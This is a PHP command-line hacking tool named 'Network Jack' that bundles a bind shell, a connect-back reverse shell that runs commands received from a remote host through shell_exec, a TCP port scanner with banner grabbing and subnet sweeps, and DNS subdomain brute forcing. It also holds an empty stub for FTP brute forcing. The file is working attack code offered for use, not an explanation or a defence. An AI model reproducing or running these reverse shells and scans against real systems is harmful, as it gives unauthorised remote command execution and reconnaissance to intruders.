#!/usr/bin/env php
<?php
ini_set('display_errors', "Off");
ini_set('error_reporting', "~E_WARNING");

$usage = "Network Jack .02b\nWritten by: Iadnah (uplinklounge.com)\n==================================================\nUsage: ./jack <options>\n";
$usage .= "\t-p\tLocal port to listen on or remote port to connect to.\n";
$usage .= "\t-l\tEnter listen mode and listen for a connection on a port.\n";
$usage .= "\t-c\tConnect to a port on a remote host and spawn a shell.\n";
$usage .= "\t-h\tYou're here already.\n";
$usage .= "\t-s\tPortscan a host. The host must be specified after -s.\n";
$usage .= "\t-b\tGrab banners when portscanning. Will only read the first 3 lines.\n";
$usage .= "\t-dns\tBrute force subdomains of a domain.\n\t\texample: jack -dns google.com\n";


$config['brutefile'] = "jack-name-list";

function getBanner($handle, $port) {
	global $host, $config;
	stream_set_blocking($handle, 0);
	$loop=0;
	while(!feof($handle)) {
		if ($loop == 3) {
		break;
		}
		$output .= fgets($handle, 100);
		sleep(1);
		$loop++;
	}

	if (strlen($output) === 0) {
		echo "$port/tcp is open but didn't have a banner.\n";
	}
	else {
		if (!preg_match("/[a-z,A-Z,0-9]/", $output)) {
			echo "$port/tcp has a non-ascii banner. Outputting hex below.\n\t\"";
			$len = strlen($output);
			$x=0;
			while ($x < $len) {
				$char = $output{$x};
				echo "\x". bin2hex($output{$x});
				$x++;
			}
			echo "\"\n";
		}
		else {
			$output = explode("\n", $output);
			echo "$port/tcp banner:\n";
			foreach ($output as $cline) {
				echo "\t$cline\n";
			}
		}
	}

}


function bruteFTP() {
	global $config, $port, $host, $wordlist;
}

function parseSocketError($errno, $errstr, $port) {
	global $config;
	if ($errno === 0) {
		echo "Error $errno: There was a problem initializing the socket.\n";
	}
	elseif ($errno === 110) {
		echo "Connect to port $port timed out.\n";
	}
	elseif ($errno === 111) {
		echo "Connection to port $port refused.\n";
	}	
	else {
		echo "Port $port generated socket error $errno: $errstr\n";
	}
}

function pscan() {
	//simple port scanning function
	global $host, $port, $banner, $config;

	//determine if port is a range or a single port
	if (preg_match("/^[0-9]+$/", $port)) {
		$portmode = "single";
	}
	
	if ($portmode == "single") {
		if($handle = fsockopen("$host", "$port", $errno, $errstr, 2)) {
			$type = getservbyport($port, "tcp");
			if ($banner == "yes") {
				getBanner($handle, $port);
			}
			else {
				echo "Port $port ($type) seems to be open.\n";
			}
			return 0;
		}
		else {

			if ($config['verbose'] == "1") {
				parseSocketError($errno, $errstr, $port);
			}
		}
	}
	else {
		$ports = explode(",", $port);
		$count = count($ports);
		$x=0;
		$list = array();
		while ($x < $count) {
			if (preg_match("/-/", $ports[$x])) {
				$range = explode("-", $ports[$x]);
				$first = $range[0];
				$second = $range[1];
				
				if ($first < $second) {
					$high = $second;
					$low = $first;
				}
				else {
					$low = $second;
					$high = $first;
				}
				
				while ($low < $high + 1) {
					$list[] = "$low";
					$low++;
				}
	
			}
			else {
				$list[] = $ports[$x];
			}
			
			$x++;
		}
		unset($ports);
		unset($low);
		unset($high);
		unset($range);

		echo "Scanning ". count($list). " ports on $host\n";

		shuffle($list);
		foreach ($list as $thisport) {
			if($handle = fsockopen("$host", "$thisport", $errno, $errstr, 2)) {
				if ($banner == "yes") {
					getBanner($handle, $thisport);
				}
				else {
					echo "Port $thisport seems to be open.\n";
				}
			}
			else {
				if ($config['verbose'] == "1") {
					parseSocketError($errno, $errstr, $thisport);
				}
			}
			socket_close($handle);
		}
	}
}

function shellListen() {
	global $port;
	if (!isset($port)) {
		echo "You have to specify a port to listen on. Try -p <port>\n";
		return 1;
	}
	echo "Spawning a shell on port $port.\n";
	$server = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	socket_bind($server, '127.0.0.1', "$port");
	socket_listen($server);
 	
 	$rline = socket_accept($server);

	while ($server) {
		socket_write($rline, "vshell> ");

		$input = socket_read($rline, "4096");
		$input = rtrim($input);

		if ($input == "!die") {
			socket_close($server);
			socket_close($rline);
			exit;
		}


		if (preg_match("/^cd /", "$input")) {
			$newdir = substr($input, 3);
			if (!chdir("$newdir")) {
				$output = "Failed to change directories.\n";
			}
			else {
				unset($output);
			}
		
		}
		else {
			$output = shell_exec($input);
		}

		socket_write($rline, "$output");
	}
	socket_close($rline);
}


function dnsbrute() {
	global $host, $config;
	

	$handle = file($config['brutefile']);
	
	
	foreach ($handle as $test) {
		$test = trim($test);
		if($a_record = dns_get_record("$test.$host", DNS_A)) {
			echo "\n$test.$host resolves:\n";
			
			$count = count($a_record);
			foreach ($a_record as $each) {
				$ips[] = $each['ip'];
			}			

			sort($ips);
			foreach ($ips as $ip) {
				echo "\t$ip\n";
			}

			unset($a_record);
			unset($ips);

			$x = 1;
			$max = 5;
			while ($x < $max) {
				$check = $test. $x;
				if($a_record = dns_get_record("$check.$host", DNS_A)) {
					$max++;
					echo "\n$check.$host resolves:\n";
			
					foreach ($a_record as $each) {
						$ips[] = $each['ip'];
					}			
		
					sort($ips);
					foreach ($ips as $ip) {
						$reverse = gethostbyaddr($ip);

						echo "\t$ip";
						if ( ($reverse !== "$check.$host") && ($reverse !== "$ip") ) {
							echo " \t- $reverse";
						}
						echo "\n";
					}
				}
				$x++;
			}

		}
		
		unset($a_record);
		unset($ips);
	}
	
	exit;
}

function shellCB() {
	global $port, $host;
	if (!$handle = fsockopen("tcp://$host", "$port")) {
		echo "Couldn't connect to $host on port $port for some reason.\n";
		return 1;
	}

	echo "Making connection to $host on port $port...\n";

	fwrite($handle, "Incoming vshell connection...\n");

	while (!feof($handle)) {
		$input = fread($handle, 4096);
		$input = rtrim($input);
		if (preg_match("/^cd /", "$input")) {
			$newdir = substr($input, 3);
			if (!chdir("$newdir")) {
				$output = "Failed to change directories.\n";
			}
			else {
				unset($output);
			}
		
		}
		else {
			$output = shell_exec($input);
		}
		fwrite($handle, "$output\nvshell> ");
	}
}


$x = 1;

if ($argc < 2) {
	echo "$usage";
}

while ($x < $argc) {
	$arg = $argv[$x];
	switch ($arg) {
		case "-p":
			$x++;
			$port = $argv[$x];
			break;
		case "-l":
			$mode = "listen";
			break;
		case "-c":
			$mode = "connectback";
			$x++;
			$host = $argv[$x];
			break;
		case "-h":
			echo "$usage";
			exit;
		case "-s":
			$mode = "scan";
			$x++;
			$host = $argv[$x];
			break;
		case "-b":
			$banner = "yes";
			break;
		case "-v":
			$config['verbose'] = "1";
			break;
		case "-dns":
			$mode = "dnsbrute";
			$x++;
			$host = $argv[$x];
			break;
		case "-bftp":
			$mode = "bruteftp";
			$x++;
			$host = $argv[$x];
			break;
		case "-u":
			$x++;
			$userlist = $argv[$x];
			break;
		case "-U":
			$x++;
			$target_user = $argv[$x];
			break;
		case "-pass":
			$x++;
			$passlist = $argv[$x];
			break;
		case "-PASS":
			$x++;
			$target_pass = $argv[$x];
			break;
	}
	$x++;
}

if (isset($mode)) {
	if ($mode == "listen") {
		shellListen();
	}
	elseif ($mode == "connectback") {
		shellCB();
	}
	elseif ($mode == "scan") {
		if(preg_match("/[a-z,A-Z]/", $host)) {
			echo "Resolved $host to ";
			$host = gethostbyname($host);
			echo "$host\n";
		}
		if (preg_match("/\//", $host)) {
			if (preg_match("/\/24/", $host)) {
				$network = preg_replace("/0\/24/", "", $host);
				echo "about to scan network $network\n";
				
				$x=0;
				while ($x < 255) {
					$host = $network. $x;
					echo "Scanning $host\n";
					pscan();
					$x++;
				}
			}
	
		}
		else {
			pscan();
		}
	}
	elseif ($mode == "dnsbrute") {
		dnsbrute();
	}
	else {
		echo "$usage";
		return 1;
	}
}
?>
